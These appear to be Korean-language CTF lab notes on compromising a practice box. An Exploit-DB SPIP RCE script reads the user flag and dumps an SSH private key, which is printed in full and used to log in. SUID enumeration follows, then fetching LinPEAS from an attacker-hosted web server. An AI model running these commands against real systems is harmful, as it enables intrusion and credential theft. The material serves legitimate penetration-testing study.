python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "cat /home/think/user.txt" --verbose
fa229046d44eda6a3598c73ad96f4ca5
python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "ls -al /home/think/.ssh" --verbose

-rw-r--r-- 1 root root 569 Jan 10 2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10 2024 id_rsa
-rw-r--r-- 1 think think 569 Jan 10 2024 id_rsa.pub

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "cat /home/think/.ssh/id_rsa" --verbose

# RSA 탈취

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
OY8+1CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx
SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+8vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY
RYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv
+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV
QFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ
Tu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2
EAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG
qyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u
8uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc
cnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu
8yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId
eGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+9SYFUBZDUMqlTOM
H+qDg0qkLLiL55AeZfXtPebCQ8M9aY/2ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H
Ao4EkYcOBsv23yeJS8l/23Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF
mTQHoxj3Jl3M8+Au+0P+2aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV
VxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5
49F0+4+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV
8Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR
zz2F+3dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW
xlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+0nswZNAIDvKKIzzbqvBKZMfVZl4Q
UafNbJoLlXm+4lshdBSRVHPe81IYS8C+1foyX+f1HRkodpkGE0/4/StcGv4XiRBFG1qQAA
AMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l
DbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE
56P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL
IHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV
ThENf8Iz+Y8LFcKLjnDwBdFkyE9kqNRT71xyZK8t5O2Ec0vCRiLeZU/DTAFPiR+B6WPfUb
kFX8AXaUXpJmUlTLl6on7mCpNnjjsRKJDUtFm0H6MOGD/YgYE4ZvruoHCmQaeNMpc3YSrG
vKrFIed5LNAJ3kLWk8SbzZxsuERbybIKGJa8Z9lYWtpPiHCsl1wqrFiB9ikfMa2DoWTuBh
+Xk2NGp6e98Bjtf7qtBn/0rBfdZjveM1MAAADBANoC+jBOLbAHk2rKEvTY1Msbc8Nf2aXe
v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr
LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5
M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----
```

# 비밀번호 계속 요구함 -> pem 있는데 요구하도록 설정이 된건가?

┌──(root㉿docker-desktop)-[/]
└─# sudo ssh -i think.pem think@10.201.106.230

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
\*\* The server may need to be upgraded. See https://openssh.com/pq.html
Load key "think.pem": error in libcrypto
think@10.201.106.230's password:

python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.106.230/spip/spip.php -c "cat /home/think/.ssh/authorized_keys" --verbose

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher

# think.pem -> id_rsa 로 파일명 변경 후 재시도 -> 성공 -> 파일 이름이 .pem 이면 다른 방식으로 시도함 -> id_rsa 방식이면 그에 맞게 파일명도 변경하는 것이 적절

sudo ssh -i id_rsa think@10.201.106.230

# flag 1

think@ip-10-201-43-138:~$ cat user.txt
fa229046d44eda6a3598c73ad96f4ca5

think@ip-10-201-43-138:/opt$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:116:121:RealtimeKit,,,:/proc:/usr/sbin/nologin
avahi:x:117:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:118:125:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
pulse:x:119:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:120:128::/var/lib/geoclue:/usr/sbin/nologin
saned:x:121:130::/var/lib/saned:/usr/sbin/nologin
colord:x:122:131:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
gdm:x:123:132:Gnome Display Manager:/var/lib/gdm3:/bin/false
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash

# PE -> Privilege Escalation

# LinPEAS 는 자동 툴이라 OSCP 에서는 금지

허용: 정보 수집 (Enumeration) 기능.
금지: 자동 악용 (Automated Exploitation) 기능.

find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -a -perm /111 -type f 2>/dev/null

# SUID + SGID 동시 설정된 파일 찾기 (강력한 권한 상승 가능)

find / -perm -6000 -type f 2>/dev/null

think@ip-10-201-106-230:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

# 린피스 탐색 셋팅 attacker

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo chmod 777 linpeas.sh
sudo mv linpeas.sh /tmp
python3 -m http.server 80

┌──(root㉿docker-desktop)-[/]
└─# ls
bin boot data dev etc home id_rsa lib lib64 linpeas.sh media mnt opt proc root run sbin srv sys tmp usr var vpn

# 공격자 컴에 있는 linpeas.sh 설치

wget http://10.8.136.212/tmp/linpeas.sh

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:~$ wget wget http://10.8.136.212/tmp/linpeas.sh
--2025-11-09 09:17:38-- wget http://10.8.136.212/tmp/linpeas.sh
Connecting to 10.8.136.212:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:~$

# 원격지에서 현재 디렉토리에 쓰기 권한이 없으므로 /tmp 로 이동

cd /tmp
wget http://10.8.136.212/tmp/linpeas.sh

think@ip-10-201-106-230:/tmp$ wget http://10.8.136.212/tmp/linpeas.sh
--2025-11-09 09:21:45-- http://10.8.136.212/tmp/linpeas.sh
Connecting to 10.8.136.212:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).
think@ip-10-201-106-230:/tmp$

# 여전히 권한 문제 발생

# 탐색만 실행

chmod +x linpeas.sh
